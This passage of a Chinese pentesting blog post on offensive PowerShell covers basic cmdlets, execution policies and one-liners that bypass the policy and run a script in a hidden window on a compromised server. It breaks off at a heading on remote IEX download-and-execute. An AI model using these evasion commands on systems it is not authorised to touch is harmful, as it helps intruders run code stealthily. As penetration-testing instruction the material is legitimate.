<!DOCTYPE html>
<html lang="en-us" class="light">

<head>
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.118.2">

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="generator" content="Saber v0.11.2">
    <meta name="author" content="F0rmat" />
    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
    <link rel="canonical" href="https://xxe.icu/powershell-attack.html" /><meta property="og:type" content="article" />
    <meta property="title" content="Powershell在渗透测试中的利用 - F0rmat&#39;s Blog">
    <meta property="og:title" content="Powershell在渗透测试中的利用 - F0rmat&#39;s Blog">
    <meta property="twitter:title" content="Powershell在渗透测试中的利用 - F0rmat&#39;s Blog">
    <meta name="description" content="简介 在渗透测试过程中，Powershell越来越成为必不可少的利用工具。 Windows的渗透过程中，以前我们在2003的服务器中渗透都是用v">
    <meta property="og:description" content="简介 在渗透测试过程中，Powershell越来越成为必不可少的利用工具。 Windows的渗透过程中，以前我们在2003的服务器中渗透都是用v">
    <meta property="twitter:description" content="简介 在渗透测试过程中，Powershell越来越成为必不可少的利用工具。 Windows的渗透过程中，以前我们在2003的服务器中渗透都是用v">
    <meta property="og:type" content="article">
    <title>Powershell在渗透测试中的利用 - F0rmat&#39;s Blog</title>

    <meta property="og:url" content="https://xxe.icu/powershell-attack.html" />

    
    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
    
      
      <link rel="stylesheet" href="/css/main.min.b54ec2054930af35e6f9ede7e42673f1fe6d7ebf77b68305e9d6671b4b709b2d.css" integrity="sha256-tU7CBUkwrzXm+e3n5CZz8f5tfr93toMF6dZnG0twmy0="/>
    
    
  <link rel="stylesheet" href="/css/syntax.css"/>

    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
    
    
</head>

<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">

    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">

  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>

  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
      <div class="pl-4">
          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
              F0rmat&#39;s Blog
          </a>
      </div>

      <div class="block lg:hidden pr-4">
          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
          </button>
      </div>

      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
          <ul class="list-none lg:flex justify-end flex-1 items-center">
                    <li class="mr-3">
                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
                    </li>
                    <li class="mr-3">
                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
                    </li>
                    <li class="mr-3">
                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
                    </li>
                    <li class="mr-3">
                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
                    </li>
                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
                    <div id="dark-icon" class="hidden">
                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
                    </div>
                    <div id="light-icon">
                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
                    </div> 
                </button>
          </ul>
      </div>
  </div>
</nav>

    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
<section class="w-full lg:w-3/4 xl:w-3/4">

    
    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">

        
        <div>
    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
        <a href="https://xxe.icu/powershell-attack.html" title="Powershell在渗透测试中的利用">Powershell在渗透测试中的利用</a>
    </h1>
    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
        <span title=" 2022-01-16 11:04:34 CST">
            <i class="iconfont icon-calendar" aria-hidden="true"></i> 16 Jan 2022
        </span>

        <span class="hidden xl:inline-block">
            |
            <i class="iconfont icon-book"></i>
            41984 字
        </span>

        <span class="hidden xl:inline-block">
            |
            <i class="iconfont icon-clock-o"></i>
            84 分钟读完
        </span>
    </p>
</div>


        <div class="md:hidden dark:text-gray-100">
            
<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
    <div class="sticky text-sm" style="top:6em;" id="menu-content">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#简介">简介</a></li>
    <li><a href="#powershell基础">PowerShell基础</a>
      <ul>
        <li><a href="#powershell简介">PowerShell简介</a></li>
        <li><a href="#powershell的常用命令">PowerShell的常用命令</a>
          <ul>
            <li><a href="#powershell与其他命令解释器的比较">PowerShell与其他命令解释器的比较</a></li>
          </ul>
        </li>
        <li><a href="#powershell的执行策略">Powershell的执行策略</a>
          <ul>
            <li><a href="#绕执行策略">绕执行策略</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#powersploit">PowerSploit</a>
      <ul>
        <li><a href="#安装">安装</a></li>
        <li><a href="#攻击实战">攻击实战</a>
          <ul>
            <li><a href="#invoke-shellcode">Invoke-Shellcode</a></li>
            <li><a href="#invoke-dllinjection">Invoke-DllInjection</a></li>
            <li><a href="#invoke-portscan">Invoke-Portscan</a></li>
            <li><a href="#invoke-mimikatz">Invoke-Mimikatz</a></li>
            <li><a href="#get-keystrokes">Get-Keystrokes</a></li>
            <li><a href="#powerup攻击模块实战1">PowerUp攻击模块实战1</a></li>
            <li><a href="#powerup攻击模块实战2">PowerUp攻击模块实战2</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#empire">Empire</a>
      <ul>
        <li><a href="#安装-1">安装</a></li>
        <li><a href="#监听上线">监听上线</a></li>
        <li><a href="#连接主机及信息收集">连接主机及信息收集</a>
          <ul>
            <li><a href="#屏幕截图">屏幕截图</a></li>
            <li><a href="#键盘记录">键盘记录</a></li>
            <li><a href="#剪切板记录">剪切板记录</a></li>
            <li><a href="#查找共享">查找共享</a></li>
            <li><a href="#收集目标主机信息">收集目标主机信息</a></li>
            <li><a href="#arp扫描">ARP扫描</a></li>
            <li><a href="#dns信息获取">DNS信息获取</a></li>
            <li><a href="#获取域控制器">获取域控制器</a></li>
          </ul>
        </li>
        <li><a href="#权限提升">权限提升</a>
          <ul>
            <li><a href="#bypass-uac">Bypass UAC</a></li>
            <li><a href="#bypassuac_wscript">bypassuac_wscript</a></li>
            <li><a href="#powerup">PowerUP</a></li>
            <li><a href="#gpp">GPP</a></li>
          </ul>
        </li>
        <li><a href="#横向渗透">横向渗透</a>
          <ul>
            <li><a href="#令牌窃取">令牌窃取</a></li>
            <li><a href="#会话注入">会话注入</a></li>
            <li><a href="#invoke-psexec">Invoke-PsExec</a></li>
            <li><a href="#invoke-wmi">Invoke-WMI</a></li>
            <li><a href="#powershell-remoting">Powershell Remoting</a></li>
          </ul>
        </li>
        <li><a href="#后门">后门</a>
          <ul>
            <li><a href="#劫持shift后门">劫持Shift后门</a></li>
            <li><a href="#注册表注入后门">注册表注入后门</a></li>
            <li><a href="#计划任务">计划任务</a></li>
            <li><a href="#与metasploit联动">与Metasploit联动</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#nishang">Nishang</a>
      <ul>
        <li><a href="#安装-2">安装</a></li>
        <li><a href="#nishang模块攻击实战">Nishang模块攻击实战</a>
          <ul>
            <li><a href="#check-vm">Check-VM</a></li>
            <li><a href="#invoke-credentialsphish">Invoke-CredentialsPhish</a></li>
            <li><a href="#copy-vss">Copy-VSS</a></li>
            <li><a href="#firebuster-firelistener扫描器">FireBuster FireListener扫描器</a></li>
            <li><a href="#keylogger键盘记录">Keylogger键盘记录</a></li>
            <li><a href="#invoke-mimikatz-1">Invoke-Mimikatz</a></li>
            <li><a href="#get-passhashes">Get-PassHashes</a></li>
            <li><a href="#get-passhints">Get-PassHints</a></li>
          </ul>
        </li>
        <li><a href="#隐藏通信隧道">隐藏通信隧道</a>
          <ul>
            <li><a href="#基于tcp协议的交互式shell">基于TCP协议的交互式shell</a></li>
            <li><a href="#基于udp协议的交互式shell">基于UDP协议的交互式shell</a></li>
            <li><a href="#基于http和https协议的交互式shell">基于HTTP和HTTPS协议的交互式shell</a></li>
            <li><a href="#webshell后门">Webshell后门</a></li>
          </ul>
        </li>
        <li><a href="#权限提升-1">权限提升</a>
          <ul>
            <li><a href="#下载执行">下载执行</a></li>
            <li><a href="#bypass-uac-1">Bypass UAC</a></li>
            <li><a href="#删除补丁">删除补丁</a></li>
          </ul>
        </li>
        <li><a href="#其他功能">其他功能</a>
          <ul>
            <li><a href="#端口扫描">端口扫描</a></li>
            <li><a href="#弱口令爆破">弱口令爆破</a></li>
            <li><a href="#嗅探待完善">嗅探（待完善）</a></li>
            <li><a href="#屏幕窃取">屏幕窃取</a></li>
            <li><a href="#生成木马">生成木马</a></li>
            <li><a href="#后门-1">后门</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
    </div>

        </div> 

        <div class="post-content dark:text-gray-300">
            <h1 id="简介">简介</h1>
<p>在渗透测试过程中，Powershell越来越成为必不可少的利用工具。</p>
<p>Windows的渗透过程中，以前我们在2003的服务器中渗透都是用vbs、exe等方式去执行，我们需要对这些工具进行编码和免杀，还会出现各种问题。自从Windows server 2008 出来后，我们可以很方便的使用powershell操作端口扫描、文件下载、凭证获取等功能。</p>
<p>本文也是参考了徐师傅的书籍《Web-安全攻防》一书进行学习和总结，在书中也学到很多非常有用的姿势。</p>
<h1 id="powershell基础">PowerShell基础</h1>
<h2 id="powershell简介">PowerShell简介</h2>
<p>Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。你可以把它看成是命令行提示符cmd.exe的扩充，不对，应当是颠覆。 powershell需要.NET环境的支持，同时支持.NET对象。微软之所以将Powershell 定位为Power，并不是夸大其词，因为它完全支持对象。其可读性，易用性，可以位居当前所有shell之首。 当前powershell有四版本，分别为1.0，2.0，3.0 ,4.0。</p>
<ul>
<li>如果您的系统是window7或者Windows Server 2008，那么PowerShell 2.0已经内置了，可以升级为3.0，4.0。</li>
<li>如果您的系统是Windows 8 或者Windows server 2012，那么PowerShell 3.0已经内置了，可以升级为4.0。</li>
<li>如果您的系统为Windows 8.1或者Windows server 2012 R2，那默认已经是4.0了。</li>
</ul>
<h2 id="powershell的常用命令">PowerShell的常用命令</h2>
<p>在powershell中是不区分大小写的，命名规范采用的是“动词-名词”的形式，比如新建文件就是<code>New-Iterm test.txt</code>,也可以在powershell中执行类似Linux的命令，比如ls、cat等，下面是一些基本的常用命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-Item 需要创建的目录 Type Directory   #创建目录
</span></span><span class="line"><span class="cl">New-Item 需要创建的文件 Type File        #创建文件
</span></span><span class="line"><span class="cl">Remove-Item 已存在目录                  #删除目录
</span></span><span class="line"><span class="cl">Get-Content 已存在文件                  #查看文件
</span></span><span class="line"><span class="cl">Set-Content 已存在文件 &#34;hello&#34;          #给文件添加内容
</span></span><span class="line"><span class="cl">Add-Content 已存在文件 &#34;hello&#34;          #给文件追加内容
</span></span><span class="line"><span class="cl">Clear-Content 已存在文件                #清除文件内容
</span></span></code></pre></div><h3 id="powershell与其他命令解释器的比较">PowerShell与其他命令解释器的比较</h3>
<p>参考<a href="https://zh.wikipedia.org/wiki/PowerShell">Powershell_Wiki</a></p>
<table>
<thead>
<tr>
<th style="text-align:left">PowerShell（命令行）</th>
<th style="text-align:center">PowerShell（别名）</th>
<th style="text-align:center"><a href="https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">命令提示符</a></th>
<th style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Unix_shell">Unix shell</a></th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Get-ChildItem</td>
<td style="text-align:center">gci, dir, ls</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Dir_(%E5%91%BD%E4%BB%A4)">dir</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Ls">ls</a></td>
<td style="text-align:center">列出目前或指定文件夹中的所有文件和文件夹</td>
</tr>
<tr>
<td style="text-align:left">Test-Connection[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-8">a]</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Ping">ping</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Ping">ping</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Ping">ping</a></td>
<td style="text-align:center">从目前电脑向指定电脑发送<a href="https://zh.wikipedia.org/wiki/Ping">Ping</a>，或指示另一台电脑这样做</td>
</tr>
<tr>
<td style="text-align:left">Get-Content</td>
<td style="text-align:center">gc, type, cat</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=TYPE_(DOS_command)&amp;action=edit&amp;redlink=1">type</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Cat_(Unix)">cat</a></td>
<td style="text-align:center">获取文件内容</td>
</tr>
<tr>
<td style="text-align:left">Get-Command</td>
<td style="text-align:center">gcm</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Help_(command)&amp;action=edit&amp;redlink=1">help</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Type_(Unix)&amp;action=edit&amp;redlink=1">type</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Which_(command)&amp;action=edit&amp;redlink=1">which</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Compgen_(Unix)&amp;action=edit&amp;redlink=1">compgen</a></td>
<td style="text-align:center">列出可用的命令</td>
</tr>
<tr>
<td style="text-align:left">Get-Help</td>
<td style="text-align:center">help, man</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Help_(command)&amp;action=edit&amp;redlink=1">help</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Apropos_(Unix)&amp;action=edit&amp;redlink=1">apropos</a>, <a href="https://zh.wikipedia.org/wiki/%E6%89%8B%E5%86%8C%E9%A1%B5">man</a></td>
<td style="text-align:center">在控制台上打印命令的文档</td>
</tr>
<tr>
<td style="text-align:left">Clear-Host</td>
<td style="text-align:center">cls, clear</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Cls_(computing)&amp;action=edit&amp;redlink=1">cls</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Clear_(Unix)">clear</a></td>
<td style="text-align:center">清除屏幕[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-9">b]</a></td>
</tr>
<tr>
<td style="text-align:left">Copy-Item</td>
<td style="text-align:center">cpi, copy, cp</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Copy_(%E5%91%BD%E4%BB%A4)">copy</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Xcopy&amp;action=edit&amp;redlink=1">xcopy</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Robocopy&amp;action=edit&amp;redlink=1">robocopy</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Cp_(Unix)">cp</a></td>
<td style="text-align:center">将文件和文件夹复制到另一个位置</td>
</tr>
<tr>
<td style="text-align:left">Move-Item</td>
<td style="text-align:center">mi, move, mv</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Move_(command)&amp;action=edit&amp;redlink=1">move</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Mv_(Unix)">mv</a></td>
<td style="text-align:center">将文件和文件夹移动到新位置</td>
</tr>
<tr>
<td style="text-align:left">Remove-Item</td>
<td style="text-align:center">ri, del, erase, rmdir, rd, rm</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Del_(command)&amp;action=edit&amp;redlink=1">del</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Del_(command)&amp;action=edit&amp;redlink=1">erase</a>, <a href="https://zh.wikipedia.org/wiki/Rmdir">rmdir</a>, <a href="https://zh.wikipedia.org/wiki/Rmdir">rd</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Rm_(Unix)">rm</a>, rmdir</td>
<td style="text-align:center">删除文件或文件夹</td>
</tr>
<tr>
<td style="text-align:left">Rename-Item</td>
<td style="text-align:center">rni, ren, mv</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Ren_(command)&amp;action=edit&amp;redlink=1">ren</a>, rename</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Mv_(Unix)">mv</a></td>
<td style="text-align:center">重命名单个文件、文件夹、硬链接或符号链接</td>
</tr>
<tr>
<td style="text-align:left">Get-Location</td>
<td style="text-align:center">gl, cd, pwd</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)">cd</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Pwd">pwd</a></td>
<td style="text-align:center">显示工作路径（目前文件夹）</td>
</tr>
<tr>
<td style="text-align:left">Pop-Location</td>
<td style="text-align:center">popd</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Pushd_and_popd&amp;action=edit&amp;redlink=1">popd</a></td>
<td style="text-align:center">popd</td>
<td style="text-align:center">将工作路径更改为最近推送到堆栈上的位置</td>
</tr>
<tr>
<td style="text-align:left">Push-Location</td>
<td style="text-align:center">pushd</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Pushd_and_popd&amp;action=edit&amp;redlink=1">pushd</a></td>
<td style="text-align:center">pushd</td>
<td style="text-align:center">将工作路径存储到堆栈中</td>
</tr>
<tr>
<td style="text-align:left">Set-Location</td>
<td style="text-align:center">sl, cd, chdir</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)">cd</a>, <a href="https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)">chdir</a></td>
<td style="text-align:center">cd</td>
<td style="text-align:center">改变工作路径</td>
</tr>
<tr>
<td style="text-align:left">Tee-Object</td>
<td style="text-align:center">tee</td>
<td style="text-align:center">不适用</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Tee">tee</a></td>
<td style="text-align:center">将输入管道传输到文件或变量，并沿管道传递输入</td>
</tr>
<tr>
<td style="text-align:left">Write-Output</td>
<td style="text-align:center">echo, write</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Echo_(%E5%91%BD%E4%BB%A4)">echo</a></td>
<td style="text-align:center">echo</td>
<td style="text-align:center">将字符串或其他对像打印到<a href="https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E4%B8%B2%E6%B5%81">标准流</a></td>
</tr>
<tr>
<td style="text-align:left">Get-Process</td>
<td style="text-align:center">gps, ps</td>
<td style="text-align:center">tlist,[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tlist_kill-10">c]</a> <a href="https://zh.wikipedia.org/w/index.php?title=Tasklist&amp;action=edit&amp;redlink=1">tasklist</a>[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tasklist_taskkill-11">d]</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Ps_(Unix)">ps</a></td>
<td style="text-align:center">列出所有正在执行的进程</td>
</tr>
<tr>
<td style="text-align:left">Stop-Process</td>
<td style="text-align:center">spps, kill</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Kill_(command)&amp;action=edit&amp;redlink=1">kill</a>,[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tlist_kill-10">c]</a> <a href="https://zh.wikipedia.org/wiki/Kill_(%E5%91%BD%E4%BB%A4)">taskkill</a>[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tasklist_taskkill-11">d]</a></td>
<td style="text-align:center">kill[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-UNIX_kill_misnomer-12">e]</a></td>
<td style="text-align:center">停止正在执行的进程</td>
</tr>
<tr>
<td style="text-align:left">Select-String</td>
<td style="text-align:center">sls</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Findstr">findstr</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Find">find</a>, <a href="https://zh.wikipedia.org/wiki/Grep">grep</a></td>
<td style="text-align:center">打印与模式匹配的行</td>
</tr>
<tr>
<td style="text-align:left">Set-Variable</td>
<td style="text-align:center">sv, set</td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/w/index.php?title=Environment_variable&amp;action=edit&amp;redlink=1">set</a></td>
<td style="text-align:center">env, export, set, setenv</td>
<td style="text-align:center">创建或更改<a href="https://zh.wikipedia.org/wiki/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a>的内容</td>
</tr>
<tr>
<td style="text-align:left">Invoke-WebRequest</td>
<td style="text-align:center">iwr, curl, wget[<a href="https://zh.wikipedia.org/wiki/PowerShell#cite_note-13">f]</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/CURL">curl</a></td>
<td style="text-align:center"><a href="https://zh.wikipedia.org/wiki/Wget">wget</a>, curl</td>
<td style="text-align:center">获取互联网上的网页内容</td>
</tr>
</tbody>
</table>
<h2 id="powershell的执行策略">Powershell的执行策略</h2>
<p>我们来尝试写入并执行一个脚本，打开powershell的命令行，输入：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="s1">&#39;&#34;Hello,Powershell Script&#34;&#39;</span> <span class="p">&gt;</span> <span class="n">Script</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="p">.\</span><span class="n">Script</span><span class="p">.</span><span class="py">ps1</span>
</span></span></code></pre></div><p>一般情况下会出现以下的错误：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.\Script.ps1 : 无法加载文件 E:\\Script.ps1，因为在此系统上禁止运行脚本。有关详细信息，请
</span></span><span class="line"><span class="cl">参阅 http://go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。
</span></span><span class="line"><span class="cl">所在位置 行:1 字符: 1
</span></span><span class="line"><span class="cl">+ .\Script.ps1
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : UnauthorizedAccess
</span></span></code></pre></div><p>这个是因为PowerShell本身限制了我们脚本的执行，执行以下命令来查看当前的执行策略：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Get-ExecutionPolicy</span>
</span></span></code></pre></div><p>PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略 简单介绍各种策略如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Restricted</td>
<td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错。</td>
</tr>
<tr>
<td>AllSigned</td>
<td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td>
</tr>
<tr>
<td>RemoteSigned</td>
<td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td>
</tr>
<tr>
<td>Unrestricted</td>
<td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td>
</tr>
<tr>
<td>Bypass</td>
<td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td>
</tr>
<tr>
<td>Undefined</td>
<td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td>
</tr>
</tbody>
</table>
<p>一般我们可以使用以下命令来修改脚本的执行策略：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ExecutionPolicy</span> <span class="n">UnRestricted</span>
</span></span></code></pre></div><p>提示是否更改：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">执行策略更改</span>
</span></span><span class="line"><span class="cl"><span class="n">执行策略可以防止您执行不信任的脚本</span><span class="err">。</span><span class="n">更改执行策略可能会使您面临</span> <span class="n">about_Execution_Policies</span>
</span></span><span class="line"><span class="cl"><span class="n">帮助主题中所述的安全风险</span><span class="err">。</span><span class="n">是否要更改执行策略</span><span class="p">?</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Y</span><span class="p">]</span> <span class="n">是</span><span class="p">(</span><span class="n">Y</span><span class="p">)</span>  <span class="p">[</span><span class="no">N</span><span class="p">]</span> <span class="n">否</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>  <span class="p">[</span><span class="no">S</span><span class="p">]</span> <span class="n">挂起</span><span class="p">(</span><span class="n">S</span><span class="p">)</span>  <span class="p">[?]</span> <span class="n">帮助</span> <span class="p">(</span><span class="n">默认值为</span><span class="err">“</span><span class="n">Y</span><span class="err">”</span><span class="p">)</span><span class="err">:</span> <span class="n">y</span>
</span></span></code></pre></div><p>然后再重新执行下刚才的脚本即可正常运行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="p">.\</span><span class="n">Script</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="n">Hello</span><span class="p">,</span><span class="n">Powershell</span> <span class="n">Script</span>
</span></span></code></pre></div><h3 id="绕执行策略">绕执行策略</h3>
<p>在我们获取到服务器上的一个普通用户的时候是没有权限去更改执行策略的，所以我们需要使用一些技巧去如何绕过脚本执行的策略。</p>
<ol>
<li>绕过本地权限执行</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">xxx</span><span class="p">.</span><span class="py">ps1</span>
</span></span></code></pre></div><ol start="2">
<li>本地隐藏绕过权限执行脚本</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">-NoLogo</span> <span class="n">-NonInteractive</span> <span class="n">-NoProfile</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-file</span> <span class="n">xxx</span><span class="p">.</span><span class="py">ps1</span>
</span></span></code></pre></div><ol start="3">
<li>用IEX下载远程PS1脚本绕过权限执行</li>
</ol>
